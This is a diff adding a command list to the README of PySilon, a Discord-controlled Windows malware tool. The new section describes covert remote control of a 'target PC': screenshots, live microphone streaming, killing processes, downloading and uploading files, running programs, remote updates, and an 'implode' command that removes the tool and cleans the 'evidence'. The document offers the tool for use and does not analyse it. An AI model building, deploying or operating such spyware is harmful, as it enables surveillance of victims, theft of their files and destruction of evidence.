@@ -23,6 +23,41 @@ This malware is designed for Windows, however, you can prepare everything on Lin
 `pip install -r requirements.txt`<br />
 <a href="https://github.com/mategol/pysilon-python/edit/main/README.md#setup">`Follow the Setup instructions`</a>
 
+# Available commands
+`.ss` - take screenshot at any time<br />
+`.join` - join voice-channel and stream live microphone input<br />
+`.show <what-to-show>` - get list of running processes or available commands<br />
+`.kill <process-ID>` - kill any running process<br />
+`.clear` - clear messages from file-related channel<br />
+`.pwd` - show working directory (file-related channel only)<br />
+`.tree` - show tree of working directory (file-related channel only)<br />
+`.ls` - list content of working directory (file-related channel only)<br />
+`.cd <dir>` - change working directory (file-related channel only)<br />
+`.download <file-or-dir>` - download any file or zipped directory (also greater than 8MB ones) from target PC (file-related channel only)<br />
+`.upload <type> [name]` - upload any file or zipped directory (also greater than 8MB ones) onto target PC (file-related channel only)<br />
+`.start <file>` - run any file on target PC (file-related channel only)<br />
+`.remove <file-or-dir>` - remove file or directory on target PC<br />
+`.update` - update PySilon remotely<br />
+`.implode <access-code>` - remove PySilon from target PC and clean the "evidence"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 # Setup
 <b>This process consists of 3 stages:</b>
 > <a href="https://github.com/mategol/pysilon-python/edit/main/README.md#prepare-discord-server-and-discord-bot">1. Prepare Discord server and Discord BOT</a><br />
